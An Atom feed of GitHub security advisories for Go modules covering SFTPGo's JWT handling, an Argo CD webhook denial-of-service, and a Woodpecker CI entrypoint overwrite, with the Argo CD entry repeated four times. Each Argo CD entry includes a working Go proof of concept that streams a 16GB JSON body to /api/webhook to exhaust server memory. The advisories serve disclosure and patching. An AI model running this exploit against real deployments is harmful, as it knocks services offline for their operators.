<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-07-24T10:01:21.658Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/drakkan/sftpgo/v2] SFTPGo's JWT implmentation lacks certain security measures]]></title>
        <id>https://github.com/advisories/GHSA-x72p-g37q-4xr9</id>
        <link href="https://github.com/advisories/GHSA-x72p-g37q-4xr9"/>
        <updated>2024-07-22T18:47:00.000Z</updated>
        <content type="html"><![CDATA[<p>In SFTPGo 2.6.2, the JWT implementation lacks certain security measures, such as using JWT ID (JTI) claims, nonces, and proper expiration and invalidation mechanisms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40430">https://nvd.nist.gov/vuln/detail/CVE-2024-40430</a></li>
<li><a href="https://alexsecurity.rocks/posts/cve-2024-40430">https://alexsecurity.rocks/posts/cve-2024-40430</a></li>
<li><a href="https://github.com/advisories/GHSA-x72p-g37q-4xr9">https://github.com/advisories/GHSA-x72p-g37q-4xr9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x72p-g37q-4xr9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-22T09:31:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jmvp-698c-4x3w</id>
        <link href="https://github.com/advisories/GHSA-jmvp-698c-4x3w"/>
        <updated>2024-07-22T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>
<h3 id="details">Details</h3>
<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>
<p>The fix would be to enforce a limit on the size of the request being parsed.</p>
<h3 id="poc">PoC</h3>
<p>Port-forward to the argocd-server service, like so:</p>
<pre><code class="language-console">kubectl port-forward svc/argocd-server -n argocd 8080:443
</code></pre>
<p>Run the below code:</p>
<pre><code class="language-go">package main

import (
    "crypto/tls"
    "io"
    "net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
    size int64 // Total size to generate
    read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
    if r.read &gt;= r.size {
        return 0, io.EOF // Finished generating
    }

    start := false
    if r.read == 0 {
        // Start of JSON
        p[0] = '{'
        p[1] = '"'
        p[2] = 'd'
        p[3] = 'a'
        p[4] = 't'
        p[5] = 'a'
        p[6] = '"'
        p[7] = ':'
        p[8] = '"'
        n = 9
        start = true
    }

    for i := n; i &lt; len(p); i++ {
        if r.read+int64(i)-int64(n)+1 == r.size-1 {
            // End of JSON
            p[i] = '"'
            p[i+1] = '}'
            r.read += int64(i) + 2 - int64(n)
            return i + 2 - n, nil
        } else {
            p[i] = 'x' // Dummy data
        }
    }

    r.read += int64(len(p)) - int64(n)
    if start {
        return len(p), nil
    }
    return len(p) - n, nil
}

func main() {
    // Initialize the custom reader with the desired size (16GB in this case).
    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
    reader := &amp;DummyJSONReader{size: payloadSize}

    // HTTP client setup
    httpClient := &amp;http.Client{
        Timeout: 0, // No timeout
        Transport: &amp;http.Transport{
            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
    if err != nil {
        panic(err)
    }

    // Set headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-GitHub-Event", "push")

    resp, err := httpClient.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    println("Response status code:", resp.StatusCode)
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.6
v2.10.15
v2.9.20</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40634">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>
<li><a href="https://github.com/advisories/GHSA-jmvp-698c-4x3w">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmvp-698c-4x3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-22T17:20:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jmvp-698c-4x3w</id>
        <link href="https://github.com/advisories/GHSA-jmvp-698c-4x3w"/>
        <updated>2024-07-22T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>
<h3 id="details">Details</h3>
<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>
<p>The fix would be to enforce a limit on the size of the request being parsed.</p>
<h3 id="poc">PoC</h3>
<p>Port-forward to the argocd-server service, like so:</p>
<pre><code class="language-console">kubectl port-forward svc/argocd-server -n argocd 8080:443
</code></pre>
<p>Run the below code:</p>
<pre><code class="language-go">package main

import (
    "crypto/tls"
    "io"
    "net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
    size int64 // Total size to generate
    read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
    if r.read &gt;= r.size {
        return 0, io.EOF // Finished generating
    }

    start := false
    if r.read == 0 {
        // Start of JSON
        p[0] = '{'
        p[1] = '"'
        p[2] = 'd'
        p[3] = 'a'
        p[4] = 't'
        p[5] = 'a'
        p[6] = '"'
        p[7] = ':'
        p[8] = '"'
        n = 9
        start = true
    }

    for i := n; i &lt; len(p); i++ {
        if r.read+int64(i)-int64(n)+1 == r.size-1 {
            // End of JSON
            p[i] = '"'
            p[i+1] = '}'
            r.read += int64(i) + 2 - int64(n)
            return i + 2 - n, nil
        } else {
            p[i] = 'x' // Dummy data
        }
    }

    r.read += int64(len(p)) - int64(n)
    if start {
        return len(p), nil
    }
    return len(p) - n, nil
}

func main() {
    // Initialize the custom reader with the desired size (16GB in this case).
    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
    reader := &amp;DummyJSONReader{size: payloadSize}

    // HTTP client setup
    httpClient := &amp;http.Client{
        Timeout: 0, // No timeout
        Transport: &amp;http.Transport{
            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
    if err != nil {
        panic(err)
    }

    // Set headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-GitHub-Event", "push")

    resp, err := httpClient.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    println("Response status code:", resp.StatusCode)
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.6
v2.10.15
v2.9.20</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40634">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>
<li><a href="https://github.com/advisories/GHSA-jmvp-698c-4x3w">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmvp-698c-4x3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-22T17:20:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jmvp-698c-4x3w</id>
        <link href="https://github.com/advisories/GHSA-jmvp-698c-4x3w"/>
        <updated>2024-07-22T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>
<h3 id="details">Details</h3>
<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>
<p>The fix would be to enforce a limit on the size of the request being parsed.</p>
<h3 id="poc">PoC</h3>
<p>Port-forward to the argocd-server service, like so:</p>
<pre><code class="language-console">kubectl port-forward svc/argocd-server -n argocd 8080:443
</code></pre>
<p>Run the below code:</p>
<pre><code class="language-go">package main

import (
    "crypto/tls"
    "io"
    "net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
    size int64 // Total size to generate
    read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
    if r.read &gt;= r.size {
        return 0, io.EOF // Finished generating
    }

    start := false
    if r.read == 0 {
        // Start of JSON
        p[0] = '{'
        p[1] = '"'
        p[2] = 'd'
        p[3] = 'a'
        p[4] = 't'
        p[5] = 'a'
        p[6] = '"'
        p[7] = ':'
        p[8] = '"'
        n = 9
        start = true
    }

    for i := n; i &lt; len(p); i++ {
        if r.read+int64(i)-int64(n)+1 == r.size-1 {
            // End of JSON
            p[i] = '"'
            p[i+1] = '}'
            r.read += int64(i) + 2 - int64(n)
            return i + 2 - n, nil
        } else {
            p[i] = 'x' // Dummy data
        }
    }

    r.read += int64(len(p)) - int64(n)
    if start {
        return len(p), nil
    }
    return len(p) - n, nil
}

func main() {
    // Initialize the custom reader with the desired size (16GB in this case).
    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
    reader := &amp;DummyJSONReader{size: payloadSize}

    // HTTP client setup
    httpClient := &amp;http.Client{
        Timeout: 0, // No timeout
        Transport: &amp;http.Transport{
            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
    if err != nil {
        panic(err)
    }

    // Set headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-GitHub-Event", "push")

    resp, err := httpClient.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    println("Response status code:", resp.StatusCode)
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.6
v2.10.15
v2.9.20</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40634">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>
<li><a href="https://github.com/advisories/GHSA-jmvp-698c-4x3w">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmvp-698c-4x3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-22T17:20:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-jmvp-698c-4x3w</id>
        <link href="https://github.com/advisories/GHSA-jmvp-698c-4x3w"/>
        <updated>2024-07-22T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>
<h3 id="details">Details</h3>
<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case "X-GitHub-Event: push") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>
<p>The fix would be to enforce a limit on the size of the request being parsed.</p>
<h3 id="poc">PoC</h3>
<p>Port-forward to the argocd-server service, like so:</p>
<pre><code class="language-console">kubectl port-forward svc/argocd-server -n argocd 8080:443
</code></pre>
<p>Run the below code:</p>
<pre><code class="language-go">package main

import (
    "crypto/tls"
    "io"
    "net/http"
)

// Define a custom io.Reader that generates a large dummy JSON payload.
type DummyJSONReader struct {
    size int64 // Total size to generate
    read int64 // Bytes already generated
}

// Read generates the next chunk of the dummy JSON payload.
func (r *DummyJSONReader) Read(p []byte) (n int, err error) {
    if r.read &gt;= r.size {
        return 0, io.EOF // Finished generating
    }

    start := false
    if r.read == 0 {
        // Start of JSON
        p[0] = '{'
        p[1] = '"'
        p[2] = 'd'
        p[3] = 'a'
        p[4] = 't'
        p[5] = 'a'
        p[6] = '"'
        p[7] = ':'
        p[8] = '"'
        n = 9
        start = true
    }

    for i := n; i &lt; len(p); i++ {
        if r.read+int64(i)-int64(n)+1 == r.size-1 {
            // End of JSON
            p[i] = '"'
            p[i+1] = '}'
            r.read += int64(i) + 2 - int64(n)
            return i + 2 - n, nil
        } else {
            p[i] = 'x' // Dummy data
        }
    }

    r.read += int64(len(p)) - int64(n)
    if start {
        return len(p), nil
    }
    return len(p) - n, nil
}

func main() {
    // Initialize the custom reader with the desired size (16GB in this case).
    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB
    reader := &amp;DummyJSONReader{size: payloadSize}

    // HTTP client setup
    httpClient := &amp;http.Client{
        Timeout: 0, // No timeout
        Transport: &amp;http.Transport{
            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},
        },
    }

    req, err := http.NewRequest("POST", "https://localhost:8080/api/webhook", reader)
    if err != nil {
        panic(err)
    }

    // Set headers
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-GitHub-Event", "push")

    resp, err := httpClient.Do(req)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()

    println("Response status code:", resp.StatusCode)
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.6
v2.10.15
v2.9.20</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40634">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>
<li><a href="https://github.com/advisories/GHSA-jmvp-698c-4x3w">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmvp-698c-4x3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-22T17:20:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker] Woodpecker's custom workspace allow to overwrite plugin entrypoint executable]]></title>
        <id>https://github.com/advisories/GHSA-xw35-rrcp-g7xm</id>
        <link href="https://github.com/advisories/GHSA-xw35-rrcp-g7xm"/>
        <updated>2024-07-22T13:18:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>
<ul>
<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>
<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>
</ul>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
<strong>Enable the "gated" repo feature and review each change upfront</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/pull/11">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/8">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/9">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a> (info will be published later once we got adoption of the update)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Daniel Kilimnik <a href="https://x.com/D_K_Dev">@D_K_Dev</a> (Neodyme AG)</li>
<li>Felipe Custodio Romero <a href="https://x.com/_localo_">@<em>localo</em></a> (Neodyme AG)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8">https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41121">https://nvd.nist.gov/vuln/detail/CVE-2024-41121</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/8">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/9">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/pull/11">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>
<li><a href="https://github.com/advisories/GHSA-xw35-rrcp-g7xm">https://github.com/advisories/GHSA-xw35-rrcp-g7xm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw35-rrcp-g7xm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T19:59:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.woodpecker-ci.org/woodpecker/v2] Woodpecker's custom workspace allow to overwrite plugin entrypoint executable]]></title>
        <id>https://github.com/advisories/GHSA-xw35-rrcp-g7xm</id>
        <link href="https://github.com/advisories/GHSA-xw35-rrcp-g7xm"/>
        <updated>2024-07-22T13:18:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>
<ul>
<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>
<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>
</ul>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
<strong>Enable the "gated" repo feature and review each change upfront</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/pull/11">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/8">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/9">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a> (info will be published later at <a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a> (info will be published later once we got adoption of the update)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Daniel Kilimnik <a href="https://x.com/D_K_Dev">@D_K_Dev</a> (Neodyme AG)</li>
<li>Felipe Custodio Romero <a href="https://x.com/_localo_">@<em>localo</em></a> (Neodyme AG)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/issues/3924">https://github.com/woodpecker-ci/woodpecker/issues/3924</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/pull/3933">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8">https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41121">https://nvd.nist.gov/vuln/detail/CVE-2024-41121</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/8">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/issues/9">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a></li>
<li><a href="https://github.com/woodpecker-ci/woodpecker-security/pull/11">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>
<li><a href="https://github.com/advisories/GHSA-xw35-rrcp-g7xm">https://github.com/advisories/GHSA-xw35-rrcp-g7xm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
